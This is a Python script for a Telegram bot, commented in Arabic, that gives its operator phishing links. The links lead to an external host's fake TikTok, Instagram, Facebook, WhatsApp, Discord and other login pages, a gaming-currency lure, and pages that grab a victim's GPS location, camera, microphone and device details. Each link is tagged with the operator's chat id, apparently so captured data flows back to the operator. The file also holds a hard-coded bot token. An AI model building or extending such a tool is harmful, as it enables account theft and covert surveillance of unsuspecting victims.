import os, sys, subprocess, logging, time, threading

# تثبيت المكتبات الناقصة تلقائياً قبل أي استيراد
for lib in ["flask", "requests", "pyTelegramBotAPI"]:
    try:
        __import__(lib.replace("pyTelegramBotAPI", "telebot"))
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet"])

import requests
from flask import Flask, request
from telebot import TeleBot, types

# ========== الإعدادات ==========
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html-5waj.onrender.com"
APP_URL = "https://gamee-beqx.onrender.com"

bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

PAGES = [
    ("🎵 تيك توك", "tiktok.html"),       ("📷 انستقرام", "instagram.html"),
    ("👻 سناب شات", "snapchat.html"),     ("📘 فيسبوك", "facebook.html"),
    ("💬 واتساب", "whatsapp.html"),       ("✈️ تيليجرام", "telegram.html"),
    ("🐦 تويتر", "twitter.html"),         ("▶️ يوتيوب", "youtube.html"),
    ("🎮 ديسكورد", "discord.html"),       ("🤖 ريدت", "reddit.html"),
    ("🎮 ببجي UC", "pubg_cuc.html"),      ("🏆 مسابقة الحلم", "dream.html"),
    ("📍 سحب الموقع", "gps.html"),        ("📸 فحص الكاميرا", "camera.html"),
    ("🎙️ فحص الميكروفون", "mic.html"),    ("🎥 فحص الفيديو", "video.html"),
    ("📱 فحص مواصفات الجهاز", "device.html")
]

@app.route("/health")
def health():
    return "OK", 200

@app.route(f"/{TOKEN}", methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        try:
            update = types.Update.de_json(request.get_data().decode('utf-8'))
            bot.process_new_updates([update])
            return ''
        except:
            return ''
    return '!', 403

@bot.message_handler(commands=['start'])
def start(msg):
    chat_id = msg.chat.id
    markup = types.InlineKeyboardMarkup(row_width=2)
    for i in range(0, len(PAGES) - 1, 2):
        l, r = PAGES[i], PAGES[i+1]
        markup.row(types.InlineKeyboardButton(l[0], callback_data=f"ph|{l[1]}"),
                   types.InlineKeyboardButton(r[0], callback_data=f"ph|{r[1]}"))
    last = PAGES[-1]
    markup.row(types.InlineKeyboardButton(last[0], callback_data=f"ph|{last[1]}"))
    bot.send_message(chat_id, "🔱 <b>GNRAL BOT</b>\n🟢 جاهز - اختر المنصة:", reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda c: c.data.startswith("ph|"))
def send_link(call):
    chat_id = call.message.chat.id
    page = call.data.split("|")[1]
    link = f"{BASE_URL}/{page}?chat={chat_id}"
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    bot.edit_message_text(f"🔗 رابط الصفحة:\n<code>{link}</code>", chat_id, call.message.message_id, parse_mode="HTML", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data == "back")
def go_back(call):
    chat_id = call.message.chat.id
    markup = types.InlineKeyboardMarkup(row_width=2)
    for i in range(0, len(PAGES) - 1, 2):
        l, r = PAGES[i], PAGES[i+1]
        markup.row(types.InlineKeyboardButton(l[0], callback_data=f"ph|{l[1]}"),
                   types.InlineKeyboardButton(r[0], callback_data=f"ph|{r[1]}"))
    last = PAGES[-1]
    markup.row(types.InlineKeyboardButton(last[0], callback_data=f"ph|{last[1]}"))
    bot.edit_message_text("🔱 <b>GNRAL BOT</b>\n🟢 جاهز - اختر المنصة:", chat_id, call.message.message_id, parse_mode="HTML", reply_markup=markup)

def keep_alive():
    while True:
        time.sleep(120)
        try: requests.get(f"{APP_URL}/health", timeout=5)
        except: pass

if __name__ == '__main__':
    threading.Thread(target=keep_alive, daemon=True).start()
    bot.remove_webhook()
    bot.set_webhook(url=f"{APP_URL}/{TOKEN}")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))